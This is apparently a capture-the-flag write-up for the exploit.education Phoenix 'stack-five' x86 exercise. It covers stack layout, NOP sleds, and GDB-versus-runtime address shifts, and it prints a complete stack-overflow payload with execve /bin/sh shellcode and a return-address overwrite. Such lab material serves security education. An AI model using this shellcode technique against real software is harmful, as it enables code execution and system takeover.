# https://exploit.education/phoenix/stack-five/ (x86)

### This challenge is relatively straightforward, you need to place a shell code into stack and make sure return address points to the beginning. 
### Nevertheless, when you encounter something similar for the first time, you can waste a lot of time on some of the following caveats:
* First thing to keep in mind, compiler may decide to reserve more space on the stack than the size of variables / arrays in the function. Use debugger to find out the stack layout for your architecture
* Even with ASLR disabled the exact address of stack in your function can be different depending on the environment (more on this further). It is a good practice to use [Nop Sleds](https://en.wikipedia.org/wiki/Buffer_overflow#NOP_sled_technique) (unless IDPS is in place that searches for this pattern)
* There are different ways to print raw binary data, but most of them are either limited or unreliable. Consider these examples :
    * **echo -n -e "\x90\x90"**  - this is good, but limited, you have to type your whole exploit manually as it is
    * **python -c "print('A'*32 + '\xde\xad')"*** - the problem with this is the added **NL** char. 
    * **print('\90'*32, end='')*** - this solves the previous issue, but apparently python's *print* still does not work properly with binary data > 0x7F (just try the above example yourself and see what happens)

    The most reliable and relatively simple way to print binary data with python I found is this :
    ```console
    python3 -c "import sys; sys.stdout.buffer.write (b'\x90' * 0x60 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80' + b'\x90' * 0x15 + b'\xd0\xd6\xff\xff')"
    ```
* There can be a very annoying small difference between stack address when debugging inside GDB vs running the executable. You will first encounter this when your exploit will be working perfectly inside GDB, but will crash the exe when run directly. The reason for this is that the exact stack address inside your function of interest depends heavily on the enviromnent where exe runs - mostly on the exact set of the environment variables and arguments (including arg0 which can be full path to executable and can be relative). All of the above resides on stack and thus the exact address range used by the stack of the exploited function moves. In order to increase the chances of having the perfect match between GDB and direct execution you need to :
    * Always run the executable with the full path 
    * Undefine ```LINES``` and ```COLUMNS``` environment variables inside GDB
    * More info [here](https://stackoverflow.com/questions/32771657/gdb-showing-different-address-than-in-code)
* You finally saw with your own bare eyes that ```/bin/sh``` is getting executed inside GDB, but when your run the exe directly .... nothing happens, there is no crash (if you sorted out the previous issue correctly), but there is no *bash* spawned either. In this particular exercise the exploit is triggered by the input received from stdin. The catch is that the *bash* **is** spawned, but it is closed immediately because ```EOL``` is reached in your input. In order to prevent this and see your exploit working, you need to prevent the input pipe from being closed. One of the ways to achieve this is by using pipes :
```console 
   # Create a named pipe : 
    mkfifo my_fifo

   # in the same console open a cat process that will allow you to write to it 
   # and keep it open:
   cat > my_fifo
```

``` console
   # open another console and redirect contents of your pipe to exe:
   cat my_fifo | /opt/phoenix/i486/stack-five
```

```console
   # open yet another console and redirect your exploit to the pipe there
   echo "your cool exploit" > my_fifo
```

``` console
   # go back to the first console and type shell commands there
   # you will see the output in the second console where your exe runs:

   ls # for some reason the first command does not work 
   ls
     
   cat my_fifo | /opt/phoenix/i486/stack-five
   Welcome to phoenix/stack-five, brought to you by https://exploit.education
   a.out    bin2shell.sh  stack-six   syscall.S  syscall32.S

```

## Finally, The solution to the above exercise (fox x86) :

```console
python3 -c "import sys; sys.stdout.buffer.write (b'\x90' * 0x60 + b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80' + b'\x90' * 0x15 + b'\xd0\xd6\xff\xff')"
```
1. A series of NOPS
2. execve shellcode 
3. some more NOPS
4. Return address overwrite - should point somewere in between the first 60 NOPS
